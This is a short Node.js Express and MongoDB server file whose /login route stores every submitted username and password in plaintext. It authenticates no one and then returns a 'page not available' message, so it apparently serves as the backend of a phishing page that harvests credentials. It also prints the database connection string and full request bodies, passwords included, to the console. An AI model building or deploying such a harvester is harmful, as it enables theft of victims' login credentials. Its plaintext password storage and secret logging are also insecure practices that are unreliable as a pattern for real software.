require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files
app.use(express.static(path.join(__dirname, "public")));

// Debugging: Log MongoDB URI (REMOVE AFTER TESTING)
console.log("🔗 MongoDB URI:", process.env.MONGODB_URI);

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log("✅ Connected to MongoDB"))
.catch((err) => console.error("❌ MongoDB Connection Error:", err));

// Define User Schema
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});

const User = mongoose.model("User", userSchema);

// Routes
app.post("/login", async (req, res) => {
  console.log("POST /login");
  console.log("Request Body:", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    const newUser = new User({ username, password });
    await newUser.save();
    res.status(200).send("THIS PAGE IS NOT AVIALABLE ANYMORE");
  } catch (err) {
    console.error("❌ Error saving user:", err);
    return res.status(500).send("Error saving user to database");
  }
});

// Serve HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
  console.log(`🚀 Server is running on port ${port}`);
});
